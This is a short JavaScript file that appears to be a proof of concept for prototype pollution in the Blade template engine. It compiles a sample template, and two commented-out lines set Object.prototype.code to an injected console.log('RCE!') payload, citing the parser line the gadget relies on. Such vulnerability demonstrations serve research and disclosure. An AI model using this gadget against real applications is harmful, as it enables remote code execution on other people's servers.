const blade = require('blade');

/**
 * prototype pollution
 */


// Object.prototype.code = "console.log('RCE!')"
// Object.prototype.value = "somevalue" // helper property, bladejs/lib/parser/index.js::1316


const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;

blade.compile(template, {'debug': true}, function(err, tmpl) {
    console.log(err);
    tmpl({'nav': []}, function(err, html) {
        console.log(html, err);
    });
});